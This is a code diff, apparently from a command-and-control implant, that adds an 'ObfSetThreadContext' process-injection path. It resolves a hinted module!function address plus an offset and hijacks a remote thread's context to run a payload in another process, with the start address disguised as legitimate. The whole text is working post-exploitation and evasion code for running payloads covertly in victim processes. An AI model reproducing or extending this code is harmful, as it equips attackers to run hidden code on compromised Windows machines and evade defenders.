@@ -99,11 +99,35 @@ BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, voi
 				module   = data_string_asciiz(&parser);
 				function = data_string_asciiz(&parser);
 
-				if (context->sameArch && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
-					return TRUE;
-				break;
+			if (context->sameArch && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
+				return TRUE;
+			break;
 
-			/* 4.11 ObfSetThreadContext: legitimately-started thread, payload via context */
+		/* 4.11 ObfSetThreadContext "module!function+0x##": the same technique
+		 * with the thread start address the profile chose. The hint fields
+		 * are consumed on every build so the walk stays aligned with what
+		 * the TS packed. Resolution happens in THIS process: the manual only
+		 * recommends ntdll/kernel32, whose base is shared across processes. */
+		case PI_EXEC_OBFSETTHREADCONTEXT_F:
+			funcoff  = data_short(&parser);
+			module   = data_string_asciiz(&parser);
+			function = data_string_asciiz(&parser);
+#if defined _M_X64
+			{
+				HMODULE hmod = GetModuleHandleA(module);
+				FARPROC hinted = hmod != NULL ? GetProcAddress(hmod, function) : NULL;
+				if (hinted != NULL) {
+					if (inject_via_obfsetthreadcontext_hinted(context, (char *)(DWORD_PTR)hinted + funcoff, (char *)ptr + offset, parameter))
+						return TRUE;
+				}
+				else {
+					spawn_log("obf: FAIL hint unresolved", (long)opcode);
+				}
+			}
+#endif
+			break;
+
+		/* 4.11 ObfSetThreadContext: legitimately-started thread, payload via context */
 #if defined _M_X64
 			case PI_EXEC_OBFSETTHREADCONTEXT:
 				if (inject_via_obfsetthreadcontext(context, (char *)ptr + offset, parameter))
